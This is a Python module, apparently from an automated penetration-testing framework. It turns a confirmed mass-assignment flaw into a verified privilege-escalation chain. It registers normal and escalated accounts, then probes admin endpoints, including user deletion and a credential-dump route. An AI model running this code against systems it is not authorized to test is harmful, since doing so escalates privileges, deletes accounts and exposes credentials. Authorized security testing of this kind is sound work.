"""
core/cortex/kill_chain.py

Kill-chain composer — turn CONFIRMED undefended-class findings into a VERIFIED
exploit chain by *executing* it, not narrating it.

The chain ensemble (chain_arbiter) PROPOSES hypothesized chains and scores them.
This is the proof-grade complement: given a confirmed escalation primitive (a
mass-assignment that sets admin/role at registration), it mints a normal principal
AND an escalated one and differential-tests privileged operations. A hop is
VERIFIED only when the normal principal is DENIED and the escalated principal is
ALLOWED — proving the escalation grants real capability, not that the operation is
simply open to everyone (the false-positive that sinks naive chain narrators).

Output is a `KillChain` at epistemic VERIFIED — the concrete, reproduced impact of
the mass-assignment flaw (e.g. "anyone can self-register, escalate to admin, then
delete any account"). It can be surfaced as a finding and registered as a top-rank
OBSERVED/VERIFIED proposal for the arbiter.

Safety: every destructive verification targets ONLY a throwaway principal this
module itself created. It never touches a pre-existing user or object. Callers
MUST still gate execution (active mode, scope, authorized target).
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from core.cortex.chain_arbiter import ChainProposal
from core.cortex.chain_verifier import VERIFIED
from core.wraith.logic_probe import register_and_login

logger = logging.getLogger(__name__)

Send = Callable[[str, str, Optional[Dict[str, Any]]], Awaitable[Tuple[int, Any]]]


@dataclass
class PrivilegedOp:
    """A candidate operation that should be denied to a normal principal."""
    method: str
    path: str                 # may contain {victim}
    kind: str                 # human description of the capability
    needs_victim: bool = False  # destructive → target a throwaway principal only


# Common privileged operations. The differential gate (normal DENIED, escalated
# ALLOWED) keeps this honest: an op that isn't actually gated is silently dropped,
# so a generous list costs nothing in false positives.
_BUILTIN_OPS: List[PrivilegedOp] = [
    PrivilegedOp("DELETE", "/users/v1/{victim}", "delete any user account", needs_victim=True),
    PrivilegedOp("DELETE", "/api/Users/{victim}", "delete any user account", needs_victim=True),
    PrivilegedOp("DELETE", "/users/{victim}", "delete any user account", needs_victim=True),
    PrivilegedOp("GET", "/users/v1/_debug", "dump every user's credentials"),
    PrivilegedOp("GET", "/api/Users", "enumerate all user accounts"),
    PrivilegedOp("GET", "/administration", "reach the admin console"),
    PrivilegedOp("GET", "/api/admin", "reach the admin API"),
    PrivilegedOp("GET", "/admin", "reach the admin area"),
]


@dataclass
class ChainHop:
    label: str
    verified: bool
    evidence: str


@dataclass
class KillChain:
    origin: str
    goal: str
    hops: List[ChainHop]
    severity: str = "CRITICAL"

    def steps(self) -> List[str]:
        return [h.label for h in self.hops]

    def to_finding(self) -> Dict[str, Any]:
        return {
            "type": "Verified Exploit Chain (privilege escalation)",
            "severity": self.severity,
            "tool": "kill_chain",
            "target": self.origin,
            "message": "Verified kill chain → " + self.goal + ". " + "  →  ".join(self.steps()),
            "tags": ["verified", "exploit_chain", "privilege_escalation", "bfla", "broken_access_control"],
            "families": ["confirmed_vuln"],
            "metadata": {
                "vuln_class": "exploit_chain",
                "epistemic": VERIFIED,
                "goal": self.goal,
                "hops": [{"label": h.label, "verified": h.verified, "evidence": h.evidence}
                         for h in self.hops],
            },
        }

    def to_proposal(self) -> ChainProposal:
        """Surface the chain to the arbiter at the top of the epistemic ladder."""
        return ChainProposal(
            source="composer",
            method="active-verification",
            epistemic=VERIFIED,
            steps=self.steps(),
            length=len(self.hops),
            score=1.0,
            confidence=0.99,
            goal=self.goal,
            raw={"severity": self.severity},
        )


async def compose_privilege_chain(
    target: str,
    *,
    register: Tuple[str, Any],
    login: Tuple[str, Any],
    privilege_field: str,
    privilege_value: Any,
    post: Send,
    authed_send: Callable[[str], Send],
    extra_ops: Optional[List[PrivilegedOp]] = None,
    max_ops: int = 12,
) -> Optional[KillChain]:
    """Actively verify that a confirmed mass-assignment escalation grants real
    privileged capability, composing a VERIFIED kill chain. Best-effort; None when
    no privileged operation is differentially confirmed.
    """
    parsed = urlparse(target if "://" in target else "http://" + target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # Mint a normal principal and an escalated one (escalated via the confirmed
    # mass-assignment vector — the same field/value the finding proved is trusted).
    normal = await register_and_login(origin, post, register, login)
    admin = await register_and_login(origin, post, register, login,
                                     extra_fields={privilege_field: privilege_value})
    if not normal or not admin:
        return None
    (tok_n, _), (tok_a, _) = normal, admin
    if tok_n == tok_a:
        return None
    send_n, send_a = authed_send(tok_n), authed_send(tok_a)

    verified: List[Tuple[PrivilegedOp, int, int]] = []
    for op in (list(_BUILTIN_OPS) + list(extra_ops or []))[:max_ops]:
        url = origin + op.path
        if op.needs_victim:
            # Destructive: target ONLY a throwaway principal we just created.
            victim = await register_and_login(origin, post, register, login)
            if not victim:
                continue
            url = origin + op.path.replace("{victim}", str(victim[1]["username"]))

        # Differential honesty gate. The normal principal MUST be denied first —
        # otherwise the op is open to everyone and is not a privilege boundary.
        try:
            st_n, _ = await send_n(op.method, url, None)
        except Exception:
            continue
        if int(st_n) < 400:
            continue
        try:
            st_a, _ = await send_a(op.method, url, None)
        except Exception:
            continue
        if 200 <= int(st_a) < 300:
            verified.append((op, int(st_n), int(st_a)))
            logger.info("[kill_chain] verified hop: %s %s (normal=%s denied, escalated=%s allowed)",
                        op.method, op.path, st_n, st_a)

    if not verified:
        return None

    hops = [
        ChainHop("Anonymous self-registration is accepted", True,
                 f"POST {register[0]} succeeds for an unauthenticated client"),
        ChainHop(f"Privilege escalation via mass assignment: client sets "
                 f"{privilege_field}={privilege_value!r} at registration", True,
                 "confirmed by the mass-assignment finding (differential persistence)"),
    ]
    for op, st_n, st_a in verified:
        hops.append(ChainHop(
            f"Escalated principal can {op.kind} ({op.method} {op.path})", True,
            f"normal principal denied (HTTP {st_n}); escalated principal allowed (HTTP {st_a})"))

    goal = "Full administrative compromise — " + "; ".join(op.kind for op, _, _ in verified)
    return KillChain(origin=origin, goal=goal, hops=hops)
